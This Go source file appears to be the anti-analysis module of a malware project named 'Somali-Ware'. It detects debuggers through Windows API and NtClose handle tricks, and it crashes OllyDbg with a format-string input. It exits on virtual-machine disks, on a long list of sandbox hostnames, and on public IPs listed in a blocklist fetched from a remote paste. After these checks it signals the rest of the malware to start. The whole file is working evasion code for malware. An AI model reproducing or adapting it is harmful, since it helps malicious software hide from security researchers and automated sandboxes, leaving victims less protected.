package anti

import (
	"Somali-Ware/modules/cache"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"
)

var (
	mk32 = syscall.NewLazyDLL("kernel32.dll")
	pidp = mk32.NewProc("IsDebuggerPresent")
	crdp = mk32.NewProc("CheckRemoteDebuggerPresent")

	// most of this was initally made by EvilByteCode (codepulze)
	ntdll                = syscall.NewLazyDLL("ntdll.dll")
	ntClose              = ntdll.NewProc("NtClose")
	createMutex          = syscall.NewLazyDLL("kernel32.dll").NewProc("CreateMutexA")
	setHandleInformation = syscall.NewLazyDLL("kernel32.dll").NewProc("SetHandleInformation")

	handleFlagProtectFromClose = uint32(0x00000002)

	///////////////////// exploiting log console
	k32           = syscall.MustLoadDLL("kernel32.dll")
	DebugStrgingA = k32.MustFindProc("OutputDebugStringA")
	gle           = k32.MustFindProc("GetLastError")
)

func NtCloseAntiDebug_InvalidHandle() bool {
	r1, _, _ := ntClose.Call(uintptr(0x1231222))
	return r1 != 0
}

func NtCloseAntiDebug_ProtectedHandle() bool {
	out, err := syscall.UTF16PtrFromString(fmt.Sprintf("%d", 1234567))
	if err != nil {
		return false
	}
	r1, _, _ := createMutex.Call(0, 0, uintptr(unsafe.Pointer(out)))
	hMutex := uintptr(r1)
	r1, _, _ = setHandleInformation.Call(hMutex, uintptr(handleFlagProtectFromClose), uintptr(handleFlagProtectFromClose))
	if r1 == 0 {
		return false
	}
	r1, _, _ = ntClose.Call(hMutex)
	return r1 != 0
}

func OutputDebugStringAntiDebug() bool {
	naughty := "hm"
	txptr, _ := syscall.UTF16PtrFromString(naughty)
	DebugStrgingA.Call(uintptr(unsafe.Pointer(txptr)))
	ret, _, _ := gle.Call()
	return ret == 0
}

func OllyDbgExploit(text string) {
	txptr, err := syscall.UTF16PtrFromString(text)
	if err != nil {
		panic(err)
	}
	DebugStrgingA.Call(uintptr(unsafe.Pointer(txptr)))
}

func AntiDebug() {
	device_drive, _ := exec.Command("cmd", "/C", "wmic diskdrive get model").Output()
	if strings.Contains(string(device_drive), "DADY HARDDISK") || strings.Contains(string(device_drive), "QEMU HARDDISK") {
		os.Exit(-1)
	}

	badpcname := []string{"00900BC83803", "0CC47AC83803", "6C4E733F-C2D9-4", "ACEPC", "AIDANPC", "ALENMOOS-PC", "ALIONE", "APPONFLY-VPS", "ARCHIBALDPC", "azure", "B30F0242-1C6A-4", "BAROSINO-PC", "BECKER-PC", "BEE7370C-8C0C-4", "COFFEE-SHOP", "COMPNAME_4047", "d1bnJkfVlH", "DESKTOP-19OLLTD", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "DESKTOP-4U8DTF8", "DESKTOP-54XGX6F", "DESKTOP-5OV9S0O", "DESKTOP-6AKQQAM", "DESKTOP-6BMFT65", "DESKTOP-70T5SDX", "DESKTOP-7AFSTDP", "DESKTOP-7XC6GEZ", "DESKTOP-8K9D93B", "DESKTOP-AHGXKTV", "DESKTOP-ALBERTO", "DESKTOP-B0T93D6", "DESKTOP-BGN5L8Y", "DESKTOP-BUGIO", "DESKTOP-BXJYAEC", "DESKTOP-CBGPFEE", "DESKTOP-CDQE7VN", "DESKTOP-CHAYANN", "DESKTOP-CM0DAW8", "DESKTOP-CNFVLMW", "DESKTOP-CRCCCOT", "DESKTOP-D019GDM", "DESKTOP-D4FEN3M", "DESKTOP-DE369SE", "DESKTOP-DIL6IYA", "DESKTOP-ECWZXY2", "DESKTOP-F7BGEN9", "DESKTOP-FSHHZLJ", "DESKTOP-G4CWFLF", "DESKTOP-GELATOR", "DESKTOP-GLBAZXT", "DESKTOP-GNQZM0O", "DESKTOP-GPPK5VQ", "DESKTOP-HASANLO", "DESKTOP-HQLUWFA", "DESKTOP-HSS0DJ9", "DESKTOP-IAPKN1P", "DESKTOP-IFCAQVL", "DESKTOP-ION5ZSB", "DESKTOP-JQPIFWD", "DESKTOP-KALVINO", "DESKTOP-KOKOVSK", "DESKTOP-NAKFFMT", "DESKTOP-NKP0I4P", "DESKTOP-NM1ZPLG", "DESKTOP-NTU7VUO", "DESKTOP-QUAY8GS", "DESKTOP-RCA3QWX", "DESKTOP-RHXDKWW", "DESKTOP-S1LFPHO", "DESKTOP-SUPERIO", "DESKTOP-V1L26J5", "DESKTOP-VIRENDO", "DESKTOP-VKNFFB6", "DESKTOP-VRSQLAG", "DESKTOP-VWJU7MF", "DESKTOP-VZ5ZSYI", "DESKTOP-W8JLV9V", "DESKTOP-WG3MYJS", "DESKTOP-WI8CLET", "DESKTOP-XOY7MHS", "DESKTOP-Y8ASUIL", "DESKTOP-YW9UO1H", "DESKTOP-ZJF9KAN", "DESKTOP-ZMYEHDA", "DESKTOP-ZNCAEAM", "DESKTOP-ZOJJ8KL", "DESKTOP-ZV9GVYL", "DOMIC-DESKTOP", "EA8C2E2A-D017-4", "ESPNHOOL", "GANGISTAN", "GBQHURCC", "GRAFPC", "GRXNNIIE", "gYyZc9HZCYhRLNg", "JBYQTQBO", "JERRY-TRUJILLO", "JOHN-PC", "JUDES-DOJO", "JULIA-PC", "LANTECH-LLC", "LISA-PC", "LOUISE-PC", "LUCAS-PC", "MIKE-PC", "NETTYPC", "ORELEEPC", "ORXGKKZC", "Paul Jones", "PC-DANIELE", "PROPERTY-LTD", "Q9IATRKPRH", "QarZhrdBpj", "RALPHS-PC", "SERVER-PC", "SERVER1", "Steve", "SYKGUIDE-WS17", "T00917", "test42", "TIQIYLA9TW5M", "TMKNGOMU", "TVM-PC", "VONRAHEL", "WILEYPC", "WIN-5E07COS9ALR", "WINDOWS-EEL53SN", "WINZDS-1BHRVPQU", "WINZDS-22URJIBV", "WINZDS-3FF2I9SN", "WINZDS-5J75DTHH", "WINZDS-6TUIHN7R", "WINZDS-8MAEI8E4", "WINZDS-9IO75SVG", "WINZDS-AM76HPK2", "WINZDS-B03L9CEO", "WINZDS-BMSMD8ME", "WINZDS-BUAOKGG1", "WINZDS-K7VIK4FC", "WINZDS-QNGKGN59", "WINZDS-RST0E8VU", "WINZDS-U95191IG", "WINZDS-VQH86L5D", "WINZDS-MILOBM35", "WINZDS-PU0URPVI", "ABIGAI", "JUANYARO", "floppy", "CATWRIGHT", "llc"}

	cpcn, _ := os.Hostname()

	for _, pat := range badpcname {
		if strings.Contains(cpcn, pat) {
			os.Exit(-1)
		}
	}

	check_ip()

	for {
		// for debuggers like x64dbg or any other
		OutputDebugStringAntiDebug()
		// this is for ollydbg
		OllyDbgExploit("%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s")

		// is debugger present check below
		flag, _, _ := pidp.Call()
		if flag != 0 {
			os.Exit(-1)
		}
		var isremdebpres bool
		crdp.Call(^uintptr(0), uintptr(unsafe.Pointer(&isremdebpres)))
		if isremdebpres {
			os.Exit(-1)
		}

		cache.CacheMutex.Lock()
		cache.GlobalStart = true
		cache.CacheCond.Signal()
		cache.CacheMutex.Unlock()
	}
}

func check_ip() {
	iplst, err := http.Get("https://rentry.co/hikbicky/raw")
	if err != nil {
		os.Exit(-1)
	}
	defer iplst.Body.Close()
	ipdat, err := http.Get("https://api.ipify.org/?format=json")
	if err != nil {
		os.Exit(-1)
	}
	defer ipdat.Body.Close()
	ipbyt, err := io.ReadAll(iplst.Body)
	if err != nil {
		os.Exit(-1)
	}
	var dat map[string]string
	json.NewDecoder(ipdat.Body).Decode(&dat)
	if string(ipbyt) == dat["ip"] {
		os.Exit(-1)
	}
}
